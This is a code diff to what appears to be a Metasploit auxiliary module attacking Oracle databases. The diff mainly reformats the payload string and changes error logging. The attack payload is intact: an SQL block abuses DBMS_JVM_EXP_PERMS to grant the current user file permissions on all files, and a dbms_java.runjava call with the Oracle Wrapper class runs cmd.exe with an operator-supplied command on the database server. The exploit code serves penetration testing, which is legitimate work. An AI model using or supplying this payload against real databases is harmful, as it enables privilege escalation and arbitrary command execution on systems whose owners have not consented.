@@ -47,10 +47,9 @@ class Metasploit3 < Msf::Auxiliary
 		name = Rex::Text.rand_text_alpha(rand(10) + 1)
 
 
-		package = "DECLARE POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;CURSOR C1 IS SELECT 'GRANT',USER(), 'SYS','java.io.FilePermission','<<ALL FILES>>','execute','ENABLED' from dual;BEGIN OPEN C1;FETCH C1 BULK COLLECT INTO POL;CLOSE C1;DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);END;"
+		package = "DECLARE POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;CURSOR C1 IS SELECT 'GRANT',USER(), 'SYS','java.io.FilePermission','"
+		package << "<" << "<ALL FILES>>','execute','ENABLED' from dual;BEGIN OPEN C1;FETCH C1 BULK COLLECT INTO POL;CLOSE C1;DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);END;"
 		os_code = "select dbms_java.runjava('oracle/aurora/util/Wrapper c:\\\\windows\\\\system32\\\\cmd.exe /c  #{datastore['CMD']}')from dual"
-
-
 
 		begin
 			print_status("Attempting to grant JAVA IO Privileges")
@@ -58,7 +57,7 @@ class Metasploit3 < Msf::Auxiliary
 			print_status("Attempting to execute OS Code")
 			prepare_exec(os_code)
 		rescue => e
-			print_status("Error: #{e.class} #{e}")
+			print_error("Error: #{e.class} #{e}")
 		end
 	end
 
